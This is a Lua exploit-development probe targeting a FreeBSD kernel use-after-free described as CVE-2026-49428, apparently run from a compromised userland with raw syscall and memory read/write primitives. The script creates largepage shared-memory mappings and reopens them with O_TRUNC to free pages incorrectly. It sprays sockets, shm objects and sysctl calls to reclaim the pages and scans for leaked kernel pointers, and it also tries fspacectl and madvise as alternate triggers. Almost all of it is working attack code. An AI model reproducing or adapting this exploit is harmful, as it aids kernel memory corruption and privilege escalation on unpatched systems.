-- CRASH_CLASS: HIGH
-- PROBE 391c: CVE-2026-49428 — shm_open(O_TRUNC) on largepage object
--
-- Context: 391b showed ftruncate(0)+regrow gives zeroed fresh pages (correct behavior).
-- sendfile hangs (blocks despite FIONBIO). Need different trigger.
--
-- CVE-2026-49428: "open(2) with O_TRUNC and fspacectl(2) could incorrectly
-- free memory in largepage objects. These operations are not permitted on
-- largepage objects, but the implementation did not verify this."
--
-- Plan:
-- [A] Named shm: shm_open("/uaf") + ftruncate(2MB) + mmap(MAP_ALIGNED_SUPER)
-- [B] Second shm_open("/uaf", O_TRUNC) to trigger incorrect page free
-- [C] Scan mapping for non-pattern data (dangling pages reused by kernel)
-- [D] Try fspacectl(580) as alternate trigger
-- [E] Multiple shm objects: create many, truncate one, spray, scan
-- [F] Stress test: allocate kernel objects between free and scan

print("=== PROBE 391c: shm O_TRUNC UAF test ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

local SHM_SIZE = 0x200000  -- 2MB
local PAGE_SIZE = 0x4000   -- 16KB
local PAGES = SHM_SIZE / PAGE_SIZE  -- 128

-- Helper: write a name string to a buffer
local function write_name(buf, name)
    zero_buf(buf, 32)
    -- Write 4 bytes at a time
    for i = 0, #name - 1, 4 do
        local dw = 0
        for j = 0, 3 do
            local idx = i + j + 1
            if idx <= #name then
                dw = dw + string.byte(name, idx) * (256 ^ j)
            end
        end
        wd(N(buf) + i, dw)
    end
end

local name_buf = memory.alloc(32)

-- Helper: scan a mapping for changes
local function scan_mapping(base, size, label)
    local changed = 0
    local zeroed = 0
    local kptrs = 0
    local unreadable = 0
    local interesting = {}

    for off = 0, size - PAGE_SIZE, PAGE_SIZE do
        local d0 = rd(base + off)
        if d0 == nil then
            unreadable = unreadable + 1
            changed = changed + 1
            if #interesting < 5 then
                interesting[#interesting + 1] = string.format(
                    "    +0x%06X: UNREADABLE", off)
            end
        elseif d0 ~= 0xAAAAAAAA then
            changed = changed + 1
            if d0 == 0 then zeroed = zeroed + 1 end

            -- Scan first 128 bytes for kernel pointers
            for qoff = 0, 120, 8 do
                local q = rq(base + off + qoff)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        kptrs = kptrs + 1
                        if #interesting < 10 then
                            interesting[#interesting + 1] = string.format(
                                "    +0x%06X+%d: 0x%X%08X *** KPTR ***",
                                off, qoff, h, l)
                        end
                    end
                end
            end

            if d0 ~= 0 and #interesting < 10 then
                local d1 = rd(base + off + 4) or 0
                interesting[#interesting + 1] = string.format(
                    "    +0x%06X: 0x%08X 0x%08X", off, d0, d1)
            end
        end
    end

    print(string.format("  %s: %d/%d changed, %d zeroed, %d unread, %d kptrs",
        label, changed, PAGES, zeroed, unreadable, kptrs))
    for _, line in ipairs(interesting) do print(line) end
    return kptrs
end

-- ===================================================================
-- [A] Create named shm + largepage mapping
-- ===================================================================
print("[A] create named shm + largepage mmap")

write_name(name_buf, "/uaf1")
local sc482 = mk(482)
local fd1 = -1
local ok1, rv1 = pcall(function()
    return sc482(name_buf, uint64(0x202), uint64(0x180))  -- O_CREAT|O_RDWR
end)
if ok1 then fd1 = N(rv1) end
print("  shm_open(\"/uaf1\", O_CREAT|O_RDWR): fd=" .. fd1)
if fd1 < 0 then print("FAIL"); return end

local ok_ft, rv_ft = pcall(function()
    return mk(480)(uint64(fd1), uint64(SHM_SIZE))
end)
print("  ftruncate(2MB): ret=" .. (ok_ft and N(rv_ft) or -1))

local map1 = nil
local ok_mm, rv_mm = pcall(function()
    return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3),
        uint64(0x01000001), uint64(fd1), uint64(0))
end)
if ok_mm then
    local h, l = get_hi_lo(rv_mm)
    if h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF then
        map1 = N(rv_mm)
        print(string.format("  mmap: 0x%X", map1))
    end
end
if not map1 then print("FAIL mmap"); return end

-- Fill pattern
for off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
    wd(map1 + off, 0xAAAAAAAA)
    wd(map1 + off + 4, 0xBBBBBBBB)
end
print("  filled 128 pages")

if not alive() then print("DEAD"); return end
print("")

-- ===================================================================
-- [B] Trigger: shm_open same name with O_TRUNC
-- ===================================================================
print("[B] shm_open(\"/uaf1\", O_TRUNC|O_RDWR)")

-- O_TRUNC = 0x400
local fd2 = -1
local ok2, rv2 = pcall(function()
    return sc482(name_buf, uint64(0x402), uint64(0x180))  -- O_TRUNC|O_RDWR
end)
if ok2 then fd2 = N(rv2) end
print("  ret: fd=" .. fd2)

if not alive() then print("DEAD after O_TRUNC"); return end

-- Check mapping immediately
scan_mapping(map1, SHM_SIZE, "post-O_TRUNC")
print("")

-- ===================================================================
-- [C] Spray kernel objects to reclaim freed pages
-- ===================================================================
print("[C] spray + rescan")

-- Spray: create many sockets (each allocates kernel objects)
local spray_fds = {}
for i = 1, 200 do
    if not alive() then break end
    local ok_s, rv_s = pcall(function()
        return mk(97)(uint64(1), uint64(1), uint64(0))  -- socket(AF_UNIX, SOCK_STREAM)
    end)
    if ok_s then
        local fd = N(rv_s)
        if fd > 0 then spray_fds[#spray_fds + 1] = fd end
    end
end
print("  sprayed " .. #spray_fds .. " sockets")

-- Also spray shm objects (bigger allocations)
for i = 1, 50 do
    if not alive() then break end
    pcall(function()
        local fd = sc482(uint64(1), uint64(0x202), uint64(0x180))  -- SHM_ANON
        if N(fd) > 0 then
            mk(480)(uint64(N(fd)), uint64(0x1000))  -- 4KB each
        end
    end)
end
print("  sprayed 50 shm objects")

-- Spray via sysctl to trigger kernel page allocations
local mib = memory.alloc(32)
local outbuf = memory.alloc(0x1000)
local olen = memory.alloc(8)
for i = 1, 50 do
    if not alive() then break end
    zero_buf(mib, 32)
    wd(N(mib), 1)      -- CTL_KERN
    wd(N(mib) + 4, 14)  -- KERN_PROC
    wd(N(mib) + 8, 1)   -- KERN_PROC_PID
    wd(N(mib) + 12, pid_val)
    wd(N(olen), 0x1000)
    pcall(function()
        mk(202)(mib, uint64(4), outbuf, olen, uint64(0), uint64(0))
    end)
end

if not alive() then print("DEAD after spray"); return end

-- Rescan mapping
local kp = scan_mapping(map1, SHM_SIZE, "post-spray")
print("")

-- ===================================================================
-- [D] Try fspacectl as alternate trigger
-- ===================================================================
print("[D] fspacectl trigger")

-- fspacectl might be syscall 580 on FreeBSD 14
-- fspacectl(fd, cmd, rqsr, rmsr) — SPACECTL_DEALLOC = 1
local sc_fspacectl = mk(580)

-- First: create fresh shm
write_name(name_buf, "/uaf2")
local fd3 = -1
local ok3, rv3 = pcall(function()
    return sc482(name_buf, uint64(0x202), uint64(0x180))
end)
if ok3 then fd3 = N(rv3) end
print("  shm_open(\"/uaf2\"): fd=" .. fd3)

if fd3 >= 0 then
    pcall(function() mk(480)(uint64(fd3), uint64(SHM_SIZE)) end)

    -- mmap it
    local map2 = nil
    local ok_m2, rv_m2 = pcall(function()
        return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3),
            uint64(0x01000001), uint64(fd3), uint64(0))
    end)
    if ok_m2 then
        local h, l = get_hi_lo(rv_m2)
        if h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF then map2 = N(rv_m2) end
    end

    if map2 then
        -- Fill pattern
        for off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
            wd(map2 + off, 0xAAAAAAAA)
        end

        -- fspacectl: SPACECTL_DEALLOC entire range
        -- struct spacectl_range { off_t r_offset; off_t r_len; }
        local rqsr = memory.alloc(16)
        local rmsr = memory.alloc(16)
        zero_buf(rqsr, 16)
        zero_buf(rmsr, 16)
        wq(N(rqsr), uint64(0))          -- r_offset = 0
        wq(N(rqsr) + 8, uint64(SHM_SIZE))  -- r_len = 2MB

        local ok_fs, rv_fs = pcall(function()
            return sc_fspacectl(uint64(fd3), uint64(1), rqsr, rmsr)  -- cmd=1 DEALLOC
        end)
        local ret_fs = ok_fs and N(rv_fs) or -999
        print("  fspacectl(DEALLOC, 0, 2MB): ret=" .. ret_fs)

        if not alive() then print("DEAD after fspacectl"); return end

        if ret_fs >= 0 then
            scan_mapping(map2, SHM_SIZE, "post-fspacectl")
        else
            print("  fspacectl not available or failed")
            -- Check if it's a nosys or real handler
            local ok_z, rv_z = pcall(function()
                return sc_fspacectl(uint64(0), uint64(0), uint64(0), uint64(0))
            end)
            print("  fspacectl(0,0,0,0): ret=" .. (ok_z and N(rv_z) or -999))
        end
    end
end

if not alive() then print("DEAD"); return end
print("")

-- ===================================================================
-- [E] Try madvise(MADV_FREE) as another page-free trigger
-- ===================================================================
print("[E] madvise triggers")

-- Create fresh shm for this test
local fd4 = -1
local ok4, rv4 = pcall(function()
    return sc482(uint64(1), uint64(0x202), uint64(0x180))  -- SHM_ANON
end)
if ok4 then fd4 = N(rv4) end
if fd4 < 0 then print("  skip (no fd)") else
    pcall(function() mk(480)(uint64(fd4), uint64(SHM_SIZE)) end)
    local map3 = nil
    local ok_m3, rv_m3 = pcall(function()
        return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3),
            uint64(0x01000001), uint64(fd4), uint64(0))
    end)
    if ok_m3 then
        local h, l = get_hi_lo(rv_m3)
        if h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF then map3 = N(rv_m3) end
    end

    if map3 then
        for off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
            wd(map3 + off, 0xAAAAAAAA)
        end

        -- MADV_FREE = 5, MADV_DONTNEED = 4
        -- madvise(75): madvise(addr, len, advice)
        local sc_madvise = mk(75)

        -- MADV_FREE: pages can be freed by kernel when needed
        local ok_mf, rv_mf = pcall(function()
            return sc_madvise(uint64(map3), uint64(SHM_SIZE), uint64(5))
        end)
        print("  madvise(MADV_FREE): ret=" .. (ok_mf and N(rv_mf) or -999))

        if not alive() then print("DEAD"); return end

        -- Check immediately
        local d_mf = rd(map3)
        print(string.format("  after MADV_FREE: 0x%X", d_mf or 0))

        -- MADV_DONTNEED: pages zeroed immediately on Linux, undefined on BSD
        local ok_dn, rv_dn = pcall(function()
            return sc_madvise(uint64(map3), uint64(SHM_SIZE), uint64(4))
        end)
        print("  madvise(MADV_DONTNEED): ret=" .. (ok_dn and N(rv_dn) or -999))

        if not alive() then print("DEAD"); return end

        local d_dn = rd(map3)
        print(string.format("  after MADV_DONTNEED: 0x%X", d_dn or 0))

        -- If either changed data, scan for kernel pointers
        if d_mf ~= 0xAAAAAAAA or d_dn ~= 0xAAAAAAAA then
            scan_mapping(map3, SHM_SIZE, "post-madvise")
        end
    end
end

-- Cleanup
pcall(function() mk(6)(uint64(fd1)) end)
if fd2 >= 0 then pcall(function() mk(6)(uint64(fd2)) end) end
if fd3 >= 0 then pcall(function() mk(6)(uint64(fd3)) end) end
if fd4 >= 0 then pcall(function() mk(6)(uint64(fd4)) end) end
for _, fd in ipairs(spray_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end

if not alive() then print("DEAD"); return end
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 391c COMPLETE ===")
